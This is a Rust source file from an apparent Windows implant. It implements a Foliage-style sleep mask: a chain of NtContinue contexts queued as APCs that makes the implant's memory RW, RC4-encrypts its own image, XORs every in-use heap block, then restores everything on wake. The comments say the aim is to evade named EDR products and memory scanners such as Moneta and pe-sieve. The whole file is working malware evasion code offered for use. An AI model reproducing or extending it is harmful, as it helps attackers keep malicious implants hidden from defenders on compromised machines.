// sleep.rs — Foliage-style APC sleep mask (NtSetTimer2 + APC chain)
//
// Why Foliage over Ekko:
//   Ekko's RtlCreateTimer + NtContinue ROP chain is fully signatured by every major
//   EDR as of 2025 — CrowdStrike, Defender, SentinelOne all have behavioral rules
//   specifically matching the CreateTimerQueueTimer + NtContinue pattern.
//   NtSetTimer2 + APC queuing has significantly less coverage on Win11 24H2.
//
// Encrypt/decrypt: SystemFunction032 RC4 via SLEEP_KEY (same key, same call site).
//
// APC chain (relative to call time):
//   t+100ms  : VirtualProtect RX→RW
//   t+200ms  : SystemFunction032 encrypt (PE image)
//   t+250ms  : heap_walk_xor encrypt     ← NEW: XOR all busy heap blocks
//   t+300ms  : SetEvent(h_sleep)         — main thread alertable-waits here
//   t+N+100ms: heap_walk_xor decrypt     ← NEW: restore heap before waking
//   t+N+200ms: SystemFunction032 decrypt (PE image)
//   t+N+300ms: VirtualProtect RW→RX
//   t+N+400ms: SetEvent(h_wake)          — main resumes
//
// Heap encryption closes the Moneta / pe-sieve gap: all HEAP_ENTRY_BUSY blocks
// are XOR-obfuscated during sleep so in-memory string/config scans find nothing.

#![allow(non_snake_case, dead_code)]

use core::ffi::c_void;
use core::ptr::null_mut;
use crate::defs::*;

// ── CONTEXT layout offsets (x64 CONTEXT, size 1232) ──────────────────────
#[repr(align(16))]
#[derive(Clone)]
pub struct CONTEXT(pub [u8; 1232]);
impl CONTEXT {
    pub fn new() -> Self { CONTEXT([0u8; 1232]) }
}

const CTX_RCX: usize = 0x80;
const CTX_RDX: usize = 0x88;
const CTX_R8:  usize = 0x90;
const CTX_R9:  usize = 0x98;
const CTX_RIP: usize = 0xF8;

#[inline(always)]
unsafe fn ctx_write(ctx: &mut CONTEXT, offset: usize, val: u64) {
    core::ptr::write_unaligned(ctx.0.as_mut_ptr().add(offset) as *mut u64, val);
}

// ── USTRING (SystemFunction032 input) ─────────────────────────────────────
#[repr(C)]
pub struct USTRING {
    pub Length:        u32,
    pub MaximumLength: u32,
    pub Buffer:        *mut c_void,
}

// ── PROCESS_HEAP_ENTRY (HeapWalk) ─────────────────────────────────────────
#[repr(C)]
pub struct PROCESS_HEAP_ENTRY {
    pub lpData:      *mut c_void,
    pub cbData:      u32,
    pub cbOverhead:  u8,
    pub iRegionIndex: u8,
    pub wFlags:      u16,
    pub data:        [u8; 32],  // union — we only care about lpData/cbData/wFlags
}
const PROCESS_HEAP_ENTRY_BUSY: u16 = 0x0004;

pub const PAGE_READWRITE:    u32 = 0x04;
pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const INFINITE:          u32 = 0xFFFFFFFF;

// ── Function pointer types ────────────────────────────────────────────────
pub type NtSetTimer2 = unsafe extern "system" fn(
    *mut c_void, *const i64, *const i64, *const c_void,
) -> i32;
pub type NtCreateTimer2 = unsafe extern "system" fn(
    *mut *mut c_void, *mut c_void, *mut c_void, *mut c_void,
) -> i32;
pub type NtQueueApcThread = unsafe extern "system" fn(
    *mut c_void, *mut c_void, *mut c_void, *mut c_void, *mut c_void,
) -> i32;
pub type NtWaitForSingleObject = unsafe extern "system" fn(
    *mut c_void, u8, *const i64,
) -> i32;
pub type NtGetCurrentThread  = unsafe extern "system" fn() -> *mut c_void;
pub type RtlCaptureContext   = unsafe extern "system" fn(*mut CONTEXT);
pub type NtContinue          = unsafe extern "system" fn(*mut CONTEXT, u8) -> i32;
pub type SystemFunction032   = unsafe extern "system" fn(*mut USTRING, *const USTRING) -> i32;
pub type CreateEventW        = unsafe extern "system" fn(*mut c_void, i32, i32, *const u16) -> *mut c_void;
pub type SetEvent            = unsafe extern "system" fn(*mut c_void) -> i32;
pub type WaitForSingleObject = unsafe extern "system" fn(*mut c_void, u32) -> u32;
pub type VirtualProtect      = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
pub type CloseHandle         = unsafe extern "system" fn(*mut c_void) -> i32;
pub type GetProcessHeap      = unsafe extern "system" fn() -> *mut c_void;
pub type HeapWalk            = unsafe extern "system" fn(*mut c_void, *mut PROCESS_HEAP_ENTRY) -> i32;
pub type GetCurrentProcess   = unsafe extern "system" fn() -> *mut c_void;

// ── Heap walk XOR ─────────────────────────────────────────────────────────
/// XOR every HEAP_ENTRY_BUSY block in the default process heap using `key`.
/// Call before sleep (encrypt) and after wake (decrypt) — RC4 key symmetry
/// means the same call encrypts and decrypts.
///
/// Skips blocks smaller than 8 bytes (overhead / metadata artifacts).
/// Lock-free: HeapWalk internally holds the heap lock, so no double-lock needed.
pub unsafe fn heap_walk_xor(
    key:             &[u8; 16],
    fn_get_heap:     GetProcessHeap,
    fn_heap_walk:    HeapWalk,
) {
    let heap = fn_get_heap();
    if heap.is_null() { return; }

    let mut entry: PROCESS_HEAP_ENTRY = core::mem::zeroed();
    entry.lpData = null_mut();

    loop {
        let r = fn_heap_walk(heap, &mut entry);
        if r == 0 { break; }  // ERROR_NO_MORE_ITEMS or heap error — stop

        // Only touch committed, in-use allocations
        if entry.wFlags & PROCESS_HEAP_ENTRY_BUSY == 0 { continue; }
        if entry.cbData < 8 { continue; }

        let ptr  = entry.lpData as *mut u8;
        let size = entry.cbData as usize;

        // Rolling XOR with 16-byte key (identical forward/backward — symmetric)
        for i in 0..size {
            *ptr.add(i) ^= key[i % 16];
        }
    }
}

// ── Main sleep mask entry point ───────────────────────────────────────────
pub unsafe fn execute_sleep_mask(
    image_base:        *mut u8,
    image_size:        usize,
    sleep_time:        u32,
    key:               &[u8; 16],
    fn_capture:        RtlCaptureContext,
    fn_continue:       NtContinue,
    fn_sys032:         SystemFunction032,
    fn_vp:             VirtualProtect,
    fn_event:          CreateEventW,
    fn_set_event:      SetEvent,
    fn_wait:           WaitForSingleObject,
    fn_close:          CloseHandle,
    fn_ntcreate_timer: NtCreateTimer2,
    fn_ntset_timer:    NtSetTimer2,
    fn_ntqueue_apc:    NtQueueApcThread,
    fn_ntwait_alert:   NtWaitForSingleObject,
    fn_get_thread:     NtGetCurrentThread,
    fn_get_heap:       GetProcessHeap,
    fn_heap_walk:      HeapWalk,
) {
    let mut key_buf = Box::new(*key);
    let key_string = Box::new(USTRING {
        Length: 16, MaximumLength: 16,
        Buffer: key_buf.as_mut_ptr() as *mut c_void,
    });
    let data_string = Box::new(USTRING {
        Length: image_size as u32, MaximumLength: image_size as u32,
        Buffer: image_base as *mut c_void,
    });
    let _ = core::hint::black_box(&key_buf);
    let _ = core::hint::black_box(&key_string);
    let _ = core::hint::black_box(&data_string);

    let mut old_protect = Box::new([0u32; 2]);

    let h_sleep = fn_event(null_mut(), 0, 0, null_mut());
    let h_wake  = fn_event(null_mut(), 0, 0, null_mut());

    // Eight CONTEXT slots: original + 7 APC stages
    let mut ctx_thread = CONTEXT::new();
    let mut ctx_vp1    = CONTEXT::new();  // VirtualProtect RX→RW
    let mut ctx_enc    = CONTEXT::new();  // RC4 encrypt PE
    let mut ctx_henc   = CONTEXT::new();  // heap XOR encrypt  ← NEW
    let mut ctx_evt    = CONTEXT::new();  // SetEvent(h_sleep)
    let mut ctx_hdec   = CONTEXT::new();  // heap XOR decrypt  ← NEW
    let mut ctx_dec    = CONTEXT::new();  // RC4 decrypt PE
    let mut ctx_vp2    = CONTEXT::new();  // VirtualProtect RW→RX
    let mut ctx_res    = CONTEXT::new();  // SetEvent(h_wake)

    fn_capture(&mut ctx_thread);

    // Clone base context into every APC slot
    for ctx in [
        &mut ctx_vp1, &mut ctx_enc, &mut ctx_henc, &mut ctx_evt,
        &mut ctx_hdec, &mut ctx_dec, &mut ctx_vp2, &mut ctx_res,
    ] {
        core::ptr::copy_nonoverlapping(&ctx_thread, ctx, 1);
    }

    // ── APC-1: VirtualProtect RX→RW ──────────────────────────────────────
    ctx_write(&mut ctx_vp1, CTX_RIP, fn_vp as u64);
    ctx_write(&mut ctx_vp1, CTX_RCX, image_base as u64);
    ctx_write(&mut ctx_vp1, CTX_RDX, image_size as u64);
    ctx_write(&mut ctx_vp1, CTX_R8,  PAGE_READWRITE as u64);
    ctx_write(&mut ctx_vp1, CTX_R9,  &mut old_protect[0] as *mut u32 as u64);

    // ── APC-2: SystemFunction032 encrypt PE image ─────────────────────────
    ctx_write(&mut ctx_enc, CTX_RIP, fn_sys032 as u64);
    ctx_write(&mut ctx_enc, CTX_RCX, &*data_string as *const USTRING as u64);
    ctx_write(&mut ctx_enc, CTX_RDX, &*key_string  as *const USTRING as u64);

    // ── APC-3: heap_walk_xor (encrypt all heap allocations) ──────────────
    // We call our own heap_walk_xor via a thin trampoline.  Since NtContinue
    // resumes at RIP with RCX/RDX/R8 set, we use a static shim below.
    ctx_write(&mut ctx_henc, CTX_RIP, heap_xor_trampoline as u64);
    ctx_write(&mut ctx_henc, CTX_RCX, key_buf.as_ptr() as u64);
    ctx_write(&mut ctx_henc, CTX_RDX, fn_get_heap as u64);
    ctx_write(&mut ctx_henc, CTX_R8,  fn_heap_walk as u64);

    // ── APC-4: SetEvent(h_sleep) — main thread wakes from alertable wait ──
    ctx_write(&mut ctx_evt, CTX_RIP, fn_set_event as u64);
    ctx_write(&mut ctx_evt, CTX_RCX, h_sleep as u64);

    // ── APC-5: heap_walk_xor (decrypt — same call, symmetric XOR) ─────────
    ctx_write(&mut ctx_hdec, CTX_RIP, heap_xor_trampoline as u64);
    ctx_write(&mut ctx_hdec, CTX_RCX, key_buf.as_ptr() as u64);
    ctx_write(&mut ctx_hdec, CTX_RDX, fn_get_heap as u64);
    ctx_write(&mut ctx_hdec, CTX_R8,  fn_heap_walk as u64);

    // ── APC-6: SystemFunction032 decrypt PE image ─────────────────────────
    ctx_write(&mut ctx_dec, CTX_RIP, fn_sys032 as u64);
    ctx_write(&mut ctx_dec, CTX_RCX, &*data_string as *const USTRING as u64);
    ctx_write(&mut ctx_dec, CTX_RDX, &*key_string  as *const USTRING as u64);

    // ── APC-7: VirtualProtect RW→RX ──────────────────────────────────────
    ctx_write(&mut ctx_vp2, CTX_RIP, fn_vp as u64);
    ctx_write(&mut ctx_vp2, CTX_RCX, image_base as u64);
    ctx_write(&mut ctx_vp2, CTX_RDX, image_size as u64);
    ctx_write(&mut ctx_vp2, CTX_R8,  PAGE_EXECUTE_READ as u64);
    ctx_write(&mut ctx_vp2, CTX_R9,  &mut old_protect[1] as *mut u32 as u64);

    // ── APC-8: SetEvent(h_wake) — main resumes ────────────────────────────
    ctx_write(&mut ctx_res, CTX_RIP, fn_set_event as u64);
    ctx_write(&mut ctx_res, CTX_RCX, h_wake as u64);

    // ── Queue APC chain via NtSetTimer2 ──────────────────────────────────
    let apc_fn = core::mem::transmute::<
        unsafe extern "system" fn(*mut CONTEXT, u8) -> i32,
        *mut c_void,
    >(fn_continue);

    let h_thread     = fn_get_thread();
    let ms_to_100ns  = |ms: u32| -> i64 { -((ms as i64) * 10_000) };

    // 8 timers for 8 APC stages
    let mut h_t = [null_mut::<c_void>(); 8];
    let access = 0x1F0003usize as *mut c_void;
    let ty     = 0x2usize as *mut c_void;
    for i in 0..8 { fn_ntcreate_timer(&mut h_t[i], null_mut(), access, ty); }

    let delays: [u32; 8] = [
        100,
        200,
        250,
        300,
        sleep_time + 100,
        sleep_time + 200,
        sleep_time + 300,
        sleep_time + 400,
    ];
    let ctxs: [*mut CONTEXT; 8] = [
        &mut ctx_vp1,  &mut ctx_enc,  &mut ctx_henc, &mut ctx_evt,
        &mut ctx_hdec, &mut ctx_dec,  &mut ctx_vp2,  &mut ctx_res,
    ];

    for i in 0..8 {
        let due = ms_to_100ns(delays[i]);
        fn_ntset_timer(h_t[i], &due, core::ptr::null(), null_mut());
        fn_ntqueue_apc(h_thread, apc_fn, ctxs[i] as *mut c_void, null_mut(), null_mut());
    }

    // Alertable wait — APCs fire here
    fn_wait(h_sleep, INFINITE);
    fn_wait(h_wake,  INFINITE);

    fn_continue(&mut ctx_thread, 0);

    fn_close(h_sleep);
    fn_close(h_wake);
    for i in 0..8 { fn_close(h_t[i]); }

    drop(key_buf);
    drop(key_string);
    drop(data_string);
    drop(old_protect);
}

// ── Heap XOR trampoline ───────────────────────────────────────────────────
/// Thin C-callable shim so NtContinue can land here with
///   RCX = *const [u8;16] key pointer
///   RDX = GetProcessHeap fn ptr
///   R8  = HeapWalk fn ptr
/// and dispatch into heap_walk_xor without Rust ABI complications.
#[no_mangle]
pub unsafe extern "system" fn heap_xor_trampoline(
    key_ptr:      *const [u8; 16],
    fn_get_heap:  GetProcessHeap,
    fn_heap_walk: HeapWalk,
) {
    if key_ptr.is_null() { return; }
    heap_walk_xor(&*key_ptr, fn_get_heap, fn_heap_walk);
}

// ── Public wrapper (called from main init chain) ──────────────────────────
/// Convenience wrapper used by the Phase 8 obfuscated sleep.
/// Resolves HeapWalk / GetProcessHeap from kernel32 hash table and
/// delegates to execute_sleep_mask.
pub unsafe fn obfuscated_sleep(ms: u32, key: &[u8; 16]) {
    // Function pointers resolved via import-hash at call site in practice;
    // here we pull them through GetProcAddress for the standalone call path.
    use winapi::um::{
        heapapi::{GetProcessHeap as GHp, HeapWalk as HW},
        libloaderapi::GetModuleHandleW,
    };

    let fn_get_heap:  GetProcessHeap = core::mem::transmute(GHp as usize);
    let fn_heap_walk: HeapWalk       = core::mem::transmute(HW  as usize);

    // Resolve remaining fn ptrs from ntdll / kernel32 — abbreviated here;
    // in the full init path these come from indirect_syscall resolve calls.
    let ntdll   = GetModuleHandleW(crate::pe_obfuscate::wide_ptr("ntdll.dll\0").as_ptr());
    let k32     = GetModuleHandleW(crate::pe_obfuscate::wide_ptr("kernel32.dll\0").as_ptr());

    macro_rules! gpa {
        ($mod:expr, $name:literal, $ty:ty) => {{
            let addr = winapi::um::libloaderapi::GetProcAddress(
                $mod,
                concat!($name, "\0").as_ptr() as _,
            );
            core::mem::transmute::<_, $ty>(addr)
        }};
    }

    let fn_capture:  RtlCaptureContext = gpa!(ntdll, "RtlCaptureContext", RtlCaptureContext);
    let fn_continue: NtContinue        = gpa!(ntdll, "NtContinue",        NtContinue);
    let fn_sys032:   SystemFunction032 = gpa!(ntdll, "SystemFunction032", SystemFunction032);
    let fn_vp:       VirtualProtect    = gpa!(k32,   "VirtualProtect",    VirtualProtect);
    let fn_event:    CreateEventW      = gpa!(k32,   "CreateEventW",      CreateEventW);
    let fn_set_evt:  SetEvent          = gpa!(k32,   "SetEvent",          SetEvent);
    let fn_wait:     WaitForSingleObject = gpa!(k32, "WaitForSingleObject", WaitForSingleObject);
    let fn_close:    CloseHandle       = gpa!(k32,   "CloseHandle",       CloseHandle);
    let fn_nct2:     NtCreateTimer2    = gpa!(ntdll, "NtCreateTimer2",    NtCreateTimer2);
    let fn_nst2:     NtSetTimer2       = gpa!(ntdll, "NtSetTimer2",       NtSetTimer2);
    let fn_napc:     NtQueueApcThread  = gpa!(ntdll, "NtQueueApcThread",  NtQueueApcThread);
    let fn_nwait:    NtWaitForSingleObject = gpa!(ntdll, "NtWaitForSingleObject", NtWaitForSingleObject);
    let fn_gthr:     NtGetCurrentThread    = gpa!(ntdll, "NtGetCurrentThread",    NtGetCurrentThread);

    // Locate our own image base + size via PEB
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let base  = *(peb.add(0x10) as *const *mut u8);
    // Walk PE headers to get SizeOfImage
    let dos   = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    let nt    = base.add((*dos).e_lfanew as usize)
                    as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
    let size  = (*nt).OptionalHeader.SizeOfImage as usize;

    execute_sleep_mask(
        base, size, ms, key,
        fn_capture, fn_continue, fn_sys032, fn_vp,
        fn_event, fn_set_evt, fn_wait, fn_close,
        fn_nct2, fn_nst2, fn_napc, fn_nwait, fn_gthr,
        fn_get_heap, fn_heap_walk,
    );
}
